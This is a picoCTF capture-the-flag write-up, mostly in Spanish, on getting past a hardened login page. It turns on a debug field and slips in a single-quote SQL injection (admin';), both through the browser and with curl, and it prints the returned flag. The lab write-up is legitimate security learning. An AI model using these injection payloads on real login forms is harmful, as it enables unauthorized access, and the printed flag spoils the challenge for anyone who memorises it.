## Descripción 
There is a website running at `https://jupiter.challenges.picoctf.org/problem/53751/` ([link](https://jupiter.challenges.picoctf.org/problem/53751/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:53751

## Datos de Acceso al Nivel
user: carlosof
password:

## Solución 1
- Ingresamos al link de la pagina y nos dirigimos a la parte del login del admin.
- Inspeccionamos la pagina web y  en el `<input type="hidden" name="debug" value="0">` cambiamos el valor a 1.
- Al tratar de ingresa la misma inyección que en el reto pasado, nos regresa lo siguiente:
```
username: admin
password: 'or 1 = 1;
SQL query: SELECT * FROM users WHERE name='admin' AND password=''or 1 = 1;'

# SQLi detected.
```
- Analizamos la siguiente consulta: 
`SELECT * FROM users WHERE name='admin'; AND password = 'password'`

- Ingresamos `admin';` en el `username`, y en  `password` la dejamos en: password.

```
username: admin';
password: password
SQL query: SELECT * FROM users WHERE name='admin';' AND password='password'

# Logged in!

Your flag is: picoCTF{m0R3_SQL_plz_c34df170}
```

## Solución 2

```bash
carlosof-picoctf@webshell:~$ curl -s https://jupiter.challenges.picoctf.org/problem/53751/login.php -d "username=admin&password=password&debug=1"
<pre>username: admin
password: password
SQL query: SELECT * FROM users WHERE name='admin' AND password='password'
</pre><h1>Login failed.</h1>carlosof-picoctf@webshell:~$ curl -s https://jupiter.challenges.pin.php -d "username=admin';&password=password&debug=1"
<pre>username: admin';
password: password
SQL query: SELECT * FROM users WHERE name='admin';' AND password='password'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_c34df170}</p>carlosof-picoctf@webshell:~$ 
```

## Notas Adicionales

## Referencias 
https://play.picoctf.org/practice/challenge/59
